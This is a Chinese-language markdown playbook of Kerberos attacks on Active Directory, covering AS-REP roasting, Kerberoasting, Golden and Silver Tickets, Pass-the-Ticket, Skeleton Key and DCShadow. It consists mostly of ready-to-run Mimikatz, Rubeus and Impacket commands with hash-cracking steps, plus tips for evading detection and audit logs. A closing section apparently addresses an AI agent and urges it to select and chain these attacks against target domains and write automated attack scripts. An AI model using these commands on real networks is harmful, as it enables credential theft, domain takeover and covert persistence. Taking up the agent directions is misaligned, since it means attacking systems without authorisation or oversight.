# Kerberos 攻击

Kerberos 是 Active Directory 的核心认证协议，存在多种攻击向量。

## Kerberos 基础

### 认证流程

**AS-REQ/AS-REP**：
- 用户请求 TGT
- KDC 验证并返回 TGT

**TGS-REQ/TGS-REP**：
- 使用 TGT 请求服务票据
- KDC 返回 TGS

**AP-REQ/AP-REP**：
- 使用 TGS 访问服务
- 服务验证票据

### 票据类型

**TGT（Ticket Granting Ticket）**：
- 由 krbtgt 账户加密
- 用于请求服务票据
- 默认有效期 10 小时

**TGS（Service Ticket）**：
- 由服务账户加密
- 用于访问特定服务
- 有效期通常 10 小时

## AS-REP Roasting

### 原理
- 用户禁用 Kerberos 预认证
- 可以请求 AS-REP 而无需密码
- AS-REP 包含用户密钥加密的数据
- 离线破解获取密码

### 枚举禁用预认证的用户

**PowerView**：
```powershell
Get-DomainUser -PreauthNotRequired
```

**LDAP 查询**：
```bash
ldapsearch -x -h dc.domain.com -b "dc=domain,dc=com" "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))"
```

**Impacket**：
```bash
GetNPUsers.py domain.com/ -dc-ip 10.10.10.10 -usersfile users.txt -format hashcat
```

### 请求 AS-REP

**Rubeus**：
```
Rubeus.exe asreproast /format:hashcat /outfile:hashes.txt
```

**Impacket**：
```bash
GetNPUsers.py domain.com/user -dc-ip 10.10.10.10 -no-pass
```

### 破解哈希

**Hashcat**：
```bash
hashcat -m 18200 hashes.txt wordlist.txt
```

**John**：
```bash
john --wordlist=wordlist.txt hashes.txt
```

## Kerberoasting

### 原理
- 请求服务账户的 TGS
- TGS 由服务账户密钥加密
- 离线破解服务账户密码

### 枚举 SPN

**PowerView**：
```powershell
Get-DomainUser -SPN
```

**setspn**：
```
setspn -T domain.com -Q */*
```

**LDAP**：
```bash
ldapsearch -x -h dc.domain.com -b "dc=domain,dc=com" "servicePrincipalName=*" servicePrincipalName
```

### 请求 TGS

**Rubeus**：
```
Rubeus.exe kerberoast /format:hashcat /outfile:hashes.txt
```

**Impacket**：
```bash
GetUserSPNs.py domain.com/user:password -dc-ip 10.10.10.10 -request
```

**PowerShell**：
```powershell
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "HTTP/server.domain.com"
```

### 破解哈希

**Hashcat**：
```bash
# RC4
hashcat -m 13100 hashes.txt wordlist.txt

# AES256
hashcat -m 19700 hashes.txt wordlist.txt
```

### 目标选择
- 高权限服务账户
- 弱密码账户
- 长期未更改密码的账户

## Golden Ticket

### 原理
- 伪造 TGT
- 使用 krbtgt 账户哈希
- 可以模拟任意用户
- 域级持久化

### 获取 krbtgt 哈希

**DCSync**：
```
mimikatz: lsadump::dcsync /domain:domain.com /user:krbtgt
```

**NTDS.dit**：
```bash
secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL
```

### 生成 Golden Ticket

**Mimikatz**：
```
kerberos::golden /user:Administrator /domain:domain.com /sid:S-1-5-21-... /krbtgt:hash /ptt
```

**Impacket**：
```bash
ticketer.py -nthash hash -domain-sid S-1-5-21-... -domain domain.com Administrator
```

**Rubeus**：
```
Rubeus.exe golden /rc4:hash /user:Administrator /domain:domain.com /sid:S-1-5-21-... /ptt
```

### 使用 Golden Ticket
- 注入票据到内存
- 访问域内任意资源
- 有效期可设置为 10 年

### 检测规避
- 使用真实用户名
- 设置合理的有效期
- 避免使用 Administrator

## Silver Ticket

### 原理
- 伪造 TGS
- 使用服务账户哈希
- 访问特定服务
- 更隐蔽

### 获取服务账户哈希

**Kerberoasting**：
- 请求并破解 TGS

**本地提取**：
- 服务运行在目标主机
- 从 LSASS 或 SAM 提取

### 生成 Silver Ticket

**Mimikatz**：
```
kerberos::golden /user:user /domain:domain.com /sid:S-1-5-21-... /target:server.domain.com /service:cifs /rc4:hash /ptt
```

**Impacket**：
```bash
ticketer.py -nthash hash -domain-sid S-1-5-21-... -domain domain.com -spn cifs/server.domain.com user
```

### 常见服务
- CIFS（文件共享）
- HTTP（Web 服务）
- MSSQL（数据库）
- LDAP（目录服务）
- HOST（多种服务）

### 优势
- 不需要 krbtgt 哈希
- 不接触域控
- 更难检测

## Overpass-the-Hash

### 原理
- 使用 NTLM 哈希请求 TGT
- 将 NTLM 认证转换为 Kerberos
- 绕过 NTLM 限制

### 执行

**Mimikatz**：
```
sekurlsa::pth /user:user /domain:domain.com /ntlm:hash /run:powershell
```

**Rubeus**：
```
Rubeus.exe asktgt /user:user /rc4:hash /ptt
Rubeus.exe asktgt /user:user /aes256:key /ptt
```

### 应用场景
- NTLM 被禁用
- 需要 Kerberos 认证
- 更隐蔽的认证方式

## Pass-the-Ticket

### 原理
- 导出现有 Kerberos 票据
- 注入到其他会话
- 重用合法票据

### 导出票据

**Mimikatz**：
```
sekurlsa::tickets /export
```

**Rubeus**：
```
Rubeus.exe dump /luid:0x3e7 /service:krbtgt
Rubeus.exe triage
```

### 注入票据

**Mimikatz**：
```
kerberos::ptt ticket.kirbi
```

**Rubeus**：
```
Rubeus.exe ptt /ticket:ticket.kirbi
```

**Linux**：
```bash
export KRB5CCNAME=/tmp/krb5cc_ticket
```

### 票据转换

**kirbi to ccache**：
```bash
ticketConverter.py ticket.kirbi ticket.ccache
```

## Skeleton Key

### 原理
- 在域控上注入 Skeleton Key
- 创建万能密码
- 不影响正常认证

### 注入

**Mimikatz**：
```
privilege::debug
misc::skeleton
```

**默认密码**：
- mimikatz

### 检测
- 需要重启域控才能清除
- 容易被检测
- 高风险操作

## DCShadow

### 原理
- 临时注册为域控
- 直接修改 AD 对象
- 绕过审计日志

### 执行

**Mimikatz**：
```
# 会话 1
!+
!processtoken
lsadump::dcshadow /object:user /attribute:primaryGroupID /value:512

# 会话 2
lsadump::dcshadow /push
```

### 要求
- 域管理员权限
- 特定网络权限

## Kerberos 委派攻击

### 非约束委派
- 服务可以模拟任意用户
- 票据存储在服务器内存
- 可以提取并重用

### 约束委派
- 限制可以模拟的服务
- S4U2Self 和 S4U2Proxy
- 可以滥用获取服务访问

### 基于资源的约束委派（RBCD）
- 资源控制委派权限
- msDS-AllowedToActOnBehalfOfOtherIdentity
- 更灵活的攻击向量

## 防御绕过

### AES 加密
- 使用 AES256 而非 RC4
- 更难检测
- 需要 AES 密钥

### 票据续期
- 使用 Renew 标志
- 延长票据有效期
- 减少请求频率

### 时间戳伪造
- 修改票据时间戳
- 绕过时间检查

---

**AI 发挥空间**：
- 根据目标环境选择合适的 Kerberos 攻击方法
- 分析域配置发现攻击向量
- 结合多种技术进行 Kerberos 攻击
- 开发自动化 Kerberos 攻击脚本

**反幻觉提示**：
- 不要假设所有域都存在可利用的 Kerberos 配置
- 验证目标域的 Kerberos 配置和防护措施
- 测试攻击方法的实际效果
- 注意 Kerberos 攻击可能触发告警
- 某些攻击需要特定权限或条件
